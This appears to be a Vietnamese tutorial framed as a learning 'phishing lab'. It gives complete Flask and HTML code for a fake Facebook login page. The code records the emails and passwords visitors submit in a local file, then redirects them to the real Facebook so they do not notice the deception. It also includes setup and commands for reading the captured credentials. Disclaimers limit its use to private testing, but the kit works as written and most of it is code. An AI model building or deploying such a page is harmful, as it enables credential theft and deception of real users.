
# Phishing Lab – Mô phỏng trang đăng nhập giả sử dụng Flask

## 1. Giới thiệu

Phishing Lab là một mô hình thử nghiệm mô phỏng tấn công giả mạo đăng nhập (phishing attack), được xây dựng với mục đích học tập và nghiên cứu trong lĩnh vực an toàn thông tin. Hệ thống được phát triển bằng ngôn ngữ Python, sử dụng framework Flask để cung cấp giao diện web và xử lý yêu cầu HTTP.

Mục tiêu của mô hình là triển khai một trang đăng nhập có giao diện tương tự các nền tảng phổ biến như Facebook hoặc Gmail. Khi người dùng nhập thông tin đăng nhập và gửi biểu mẫu, dữ liệu sẽ được lưu vào tệp nhật ký nội bộ và trình duyệt sẽ được chuyển hướng tới trang web chính thức nhằm đánh lừa cảm giác bị giả mạo.

> Lưu ý: Toàn bộ nội dung trong tài liệu này và mã nguồn đi kèm chỉ phục vụ cho mục đích học tập, mô phỏng trong môi trường riêng biệt. Người sử dụng phải chịu hoàn toàn trách nhiệm nếu sử dụng cho các mục đích không hợp pháp hoặc gây hại cho người khác.

---

## 2. Yêu cầu hệ thống

- Windows 10 hoặc 11 có cài đặt WSL (Ubuntu khuyến nghị)
- Python 3.6 trở lên
- Trình quản lý gói `pip`
- Trình duyệt web trên hệ điều hành Windows (Chrome, Firefox, Edge,...)

---

## 3. Cài đặt và cấu hình

### 3.1. Khởi tạo dự án

Mở terminal WSL và thực hiện các bước sau:

```bash
mkdir ~/phishing_lab
cd ~/phishing_lab
````

### 3.2. Tạo tập tin `app.py`

Sử dụng trình soạn thảo `nano`:

```bash
nano app.py
```

Dán nội dung sau vào:

```python
from flask import Flask, request, redirect, render_template
from datetime import datetime

app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email")
    password = request.form.get("password")
    with open("captured.txt", "a") as f:
        f.write(f"[{datetime.now()}] Email: {email}, Password: {password}\n")
    return redirect("https://facebook.com")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

Lưu và thoát:

* Nhấn `Ctrl + O`, Enter để lưu
* Nhấn `Ctrl + X` để thoát

---

### 3.3. Tạo thư mục và giao diện HTML

```bash
mkdir templates
nano templates/login.html
```

Nội dung:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Facebook – log in or sign up</title>
    <style>
        body {
            font-family: Arial;
            background-color: #f0f2f5;
            text-align: center;
        }
        .login-box {
            background: white;
            padding: 20px;
            margin: auto;
            width: 300px;
            margin-top: 100px;
            border-radius: 10px;
            box-shadow: 0 0 10px gray;
        }
        input[type=text], input[type=password] {
            width: 90%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #ddd;
        }
        button {
            padding: 10px 15px;
            width: 100%;
            background: #1877f2;
            color: white;
            border: none;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Log in to Facebook</h2>
        <form method="POST" action="/login">
            <input type="text" name="email" placeholder="Email address" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
```

---

### 3.4. Cài đặt Flask

Cài đặt Flask thông qua `pip`:

```bash
sudo apt update
sudo apt install python3-pip -y
pip3 install flask
```

---

## 4. Khởi động và kiểm thử

### 4.1. Chạy ứng dụng

```bash
python3 app.py
```

Kết quả hiển thị:

```
 * Running on http://0.0.0.0:5000/
```

### 4.2. Lấy địa chỉ IP của WSL

Trong terminal:

```bash
ip addr show eth0
```

Tìm dòng chứa `inet`, ví dụ:

```
inet 172.27.199.168/20
```

Địa chỉ này là IP của WSL.

### 4.3. Truy cập từ trình duyệt Windows

Mở trình duyệt và truy cập:

```
http://172.27.199.168:5000
```

(Thay địa chỉ IP bằng IP của WSL)

Trang đăng nhập giả sẽ được hiển thị. Sau khi nhập thông tin và bấm nút đăng nhập, dữ liệu sẽ được lưu tại tệp `captured.txt` và người dùng được chuyển hướng về trang Facebook chính thức.

---

## 5. Kiểm tra dữ liệu đã ghi

Trong WSL:

```bash
cat captured.txt
```

Dữ liệu sẽ có dạng:

```
[2025-08-06 14:23:45.123456] Email: victim@example.com, Password: 12345678
```

---

## 6. Kết thúc phiên làm việc

Nhấn `Ctrl + C` để dừng server Flask.

---

## 7. Ghi chú quan trọng

* Không triển khai hệ thống này trên các môi trường mạng thực tế hoặc công cộng.
* Không sử dụng công cụ này vào mục đích lừa đảo, thu thập dữ liệu cá nhân trái phép hoặc bất kỳ hành vi phi đạo đức nào.
* Phishing Lab chỉ nên sử dụng trong môi trường kiểm thử cá nhân, với mục tiêu nghiên cứu và nâng cao nhận thức về bảo mật.

---
